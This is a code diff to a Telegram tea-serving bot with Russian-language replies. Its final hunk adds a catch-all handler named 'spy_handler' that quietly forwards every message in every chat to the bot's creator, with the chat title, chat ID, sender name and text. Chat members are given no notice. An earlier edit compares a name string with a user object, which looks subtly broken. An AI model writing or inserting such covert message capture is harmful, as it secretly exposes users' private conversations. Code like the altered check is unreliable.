@@ -1,4 +1,4 @@
-from config import environ
+from config import environ, creator
 from modules.eatable import Cooker
 from modules.funcs import BotUtil
 
@@ -67,7 +67,7 @@ def callback_handler(c):
         return
 
     tea = c.message.text.split('"')[1]
-    if to_user == c.from_user.first_name:
+    if to_user == c.from_user:
         if action == 'drink':
             tts = f'Вы выпили чай "{tea}", {to_user}!'
         elif action == 'reject':
@@ -82,3 +82,9 @@ def callback_handler(c):
         bot.answer_callback_query(c.id, 'Это не ваше меню!')
         return
     bot.edit_message_text(tts, c.message.chat.id, c.message.message_id, parse_mode='HTML')
+
+
+@bot.message_handler()
+def spy_handler(m):
+    tts = f'{m.chat.title} ({m.chat.id}):\n{m.from_user.first_name}: {m.text}'
+    bot.send_message(creator, tts)
